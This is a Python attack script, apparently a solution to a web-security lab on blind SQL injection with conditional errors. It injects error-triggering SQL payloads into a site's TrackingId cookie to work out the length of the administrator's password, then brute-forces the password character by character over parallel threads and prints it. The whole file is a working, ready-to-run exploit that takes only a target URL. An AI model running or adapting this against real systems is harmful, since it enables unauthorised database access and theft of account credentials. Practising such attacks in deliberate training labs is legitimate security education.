import requests
import threading
import string
import sys
import urllib.parse
import getopt
from halo import Halo


def get_password_length(url, trackingId, session):
  password_length = 0
  i = 0

  while True:
    payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > {i}) ||'"
    payload = urllib.parse.quote_plus(payload)
    cookies = {"TrackingId": trackingId + payload, "session": session}
    response = requests.get(url, cookies=cookies)

    if response.status_code == 200:
      return password_length
    else:
      i += 1
      password_length += 1


def get_password(password_length, url, trackingId, session):
  characters = string.ascii_lowercase + string.digits
  valid_password = []
  threads = []

  def test_password(i, character):
      payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND SUBSTR(password, {i+1}, 1) = '{character}') ||'"
      payload = urllib.parse.quote_plus(payload)
      cookies = {"TrackingId": trackingId + payload, "session": session}
      response = requests.get(url, cookies=cookies)

      if response.status_code == 500:
        valid_password.append(character)

  for i in range(password_length):
    for character in characters:
      t = threading.Thread(target=test_password, args=(i, character))
      threads.append(t)

    for x in threads:
      x.start() 

    for x in threads:
      x.join()

    threads = []

  password = "".join(valid_password)
  return password


def get_cookie(url):
  session = requests.Session()
  response = session.get(url)
  cookies = session.cookies.get_dict()
  values = list(cookies.values())
  trackingId = values[0]
  session = values[1]
  return trackingId, session 


def main(argv):
  help_message = "This is the script for:\n'Blind SQL injection with conditional errors'\n\nUsage: python3 bsqli-2.py -u <url>"

  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print(help_message) 
    print("\x1b[?25h", end="") # Make cursor visible 
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
      trackingId, session = get_cookie(url)
    elif opt == "-h":
      print(help_message) 
      print("\x1b[?25h", end="") # Make cursor visible 
      sys.exit()

  # Create and start spinner animation
  spinner = Halo(text="Getting password length...", spinner="bouncingBar")
  spinner.start()
  # Get password length
  password_length = get_password_length(url, trackingId, session)
  # Finish spinner
  spinner.succeed(f"The password length is: \"{password_length}\"")

  # Create and start spinner animation
  spinner = Halo(text="Getting password...", spinner="bouncingBar")
  spinner.start()
  # Get valid password
  password = get_password(password_length, url, trackingId, session)
  # Finish spinner
  spinner.succeed(f"The password is: \"{password}\"")


if __name__ == "__main__":
  print("\x1b[?25l", end="") # Hide cursor
  main(sys.argv[1:])
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit()